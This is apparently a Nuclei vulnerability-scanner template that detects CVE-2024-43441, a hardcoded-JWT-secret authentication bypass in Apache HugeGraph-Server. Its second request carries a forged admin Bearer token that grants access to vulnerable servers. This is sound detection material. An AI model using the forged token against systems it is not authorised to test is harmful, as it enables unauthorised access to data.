id: CVE-2024-43441

info:
  name: Apache HugeGraph 1.0.0 < 1.5.0 - Authentication Bypass via Hardcoded JWT Secret
  author: wn147
  severity: critical
  description: |
    An Authentication Bypass vulnerability affected Apache HugeGraph-Server versions 1.0.0 to 1.4.x due to improper handling of JWT tokens. JWTs (JSON Web Tokens) are used for securely transmitting authentication information, and flaws in their validation allowed attackers to bypass security checks.
  reference:
    - https://github.com/advisories/GHSA-f697-gm3h-xrf9
    - https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246
    - https://lists.apache.org/thread/h2607yv32wgcrywov960jpxhvsmmlf12
    - http://www.openwall.com/lists/oss-security/2024/12/24/2
    - https://github.com/J1ezds/Vulnerability-Wiki-page
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-43441
    cwe-id: CWE-302
    epss-score: 0.35535
    epss-percentile: 0.96866
  metadata:
    verified: true
  tags: cve,cve2024,hugegraph,auth-bypass

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /graphs HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 401'
        internal: true

  - raw:
      - |
        GET /graphs HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjIwNzE0NzY4MzB9.vb193qf4xpIPFcmCN8J0sRwqUaoS2RAUvFx9uLC-I7Q

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"graphs":'
          - '"hugegraph"'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
